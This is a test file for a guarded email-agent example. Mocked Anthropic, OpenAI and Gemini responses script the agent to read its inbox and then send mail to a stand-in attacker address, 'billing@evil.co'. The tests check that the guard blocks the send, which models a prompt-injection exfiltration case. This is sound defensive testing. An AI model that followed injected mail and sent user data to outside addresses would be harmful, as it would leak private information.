"""The real-LLM example loop, exercised with mocked HTTP transports (no network, no keys)."""
import json
import sys
from pathlib import Path

import httpx

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "examples"))
import real_llm_agent as ex  # noqa: E402


def _client(handler):
    return httpx.Client(transport=httpx.MockTransport(handler))


def test_stub_unguarded_leaks_guarded_does_not():
    assert ex.run_agent(ex.Stub(), guarded=False, verbose=False)["leaked"] == 1
    g = ex.run_agent(ex.Stub(), guarded=True, verbose=False)
    assert g["leaked"] == 0 and g["blocked"] == 1 and len(g["sent"]) == 1


def test_anthropic_backend_blocked_call_goes_back_as_tool_result():
    seen = []
    turns = iter([
        [{"type": "tool_use", "id": "t1", "name": "read_inbox", "input": {}}],
        [{"type": "tool_use", "id": "t2", "name": "send_email",
          "input": {"to": "billing@evil.co", "subject": "x", "body": "y"}}],
        [{"type": "text", "text": "done"}],
    ])

    def handler(req: httpx.Request) -> httpx.Response:
        seen.append(json.loads(req.content))
        return httpx.Response(200, json={"content": next(turns)})

    out = ex.run_agent(ex.Anthropic(model="m", client=_client(handler)), guarded=True, verbose=False)
    assert out["leaked"] == 0 and out["blocked"] == 1
    last_user = seen[-1]["messages"][-1]["content"][0]
    assert last_user["tool_use_id"] == "t2" and "blocked by Black Onyx" in last_user["content"]


def test_openai_backend_parses_tool_calls():
    mail = json.dumps({"to": "me@corp.com", "subject": "s", "body": "b"})
    turns = iter([
        {"tool_calls": [{"id": "c1", "function": {"name": "read_inbox", "arguments": "{}"}}], "content": None},
        {"tool_calls": [{"id": "c2", "function": {"name": "send_email", "arguments": mail}}], "content": None},
        {"content": "ok"},
    ])

    def handler(req: httpx.Request) -> httpx.Response:
        return httpx.Response(200, json={"choices": [{"message": next(turns)}]})

    out = ex.run_agent(ex.OpenAICompat(model="m", base_url="http://x/v1", client=_client(handler)), guarded=True, verbose=False)
    assert out["leaked"] == 0 and out["blocked"] == 0 and len(out["sent"]) == 1


def test_gemini_backend_function_calls_and_blocking():
    seen = []
    turns = iter([
        {"role": "model", "parts": [{"functionCall": {"name": "read_inbox", "args": {}}}]},
        {"role": "model", "parts": [{"functionCall": {"name": "send_email",
                                                      "args": {"to": ex.EVIL, "subject": "x", "body": "y"}}}]},
        {"role": "model", "parts": [{"text": "done"}]},
    ])

    def handler(req: httpx.Request) -> httpx.Response:
        seen.append(json.loads(req.content))
        return httpx.Response(200, json={"candidates": [{"content": next(turns)}]})

    out = ex.run_agent(ex.Gemini(client=_client(handler)), guarded=True, verbose=False)
    assert out["leaked"] == 0 and out["blocked"] == 1
    assert "parameters" not in seen[0]["tools"][0]["functionDeclarations"][0]            # empty schema omitted
    assert seen[0]["tools"][0]["functionDeclarations"][1]["parameters"]["type"] == "OBJECT"
    fr = seen[-1]["contents"][-1]["parts"][0]["functionResponse"]
    assert fr["name"] == "send_email" and "blocked by Black Onyx" in fr["response"]["result"]
